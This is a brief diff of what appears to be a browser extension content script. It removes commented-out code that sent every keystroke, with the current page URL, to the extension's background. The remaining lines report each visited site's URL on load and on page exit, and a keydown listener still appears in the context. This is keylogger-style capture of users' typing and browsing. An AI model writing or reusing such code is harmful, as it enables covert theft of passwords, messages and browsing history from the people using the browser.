@@ -1,11 +1,3 @@
-// document.addEventListener("keydown", function(event) {
-//   chrome.runtime.sendMessage({ type: "keystroke", data: event.key, site: location.href });
-// });
-
-// // Send site information separately
-// chrome.runtime.sendMessage({ type: "site", data: location.href });
-
-
 // Send site information when the content script is injected
 chrome.runtime.sendMessage({ type: "site", data: location.href });
 
@@ -18,3 +10,5 @@ document.addEventListener("keydown", function(event) {
 window.addEventListener("beforeunload", function() {
   chrome.runtime.sendMessage({ type: "site", data: location.href });
 });
+
+
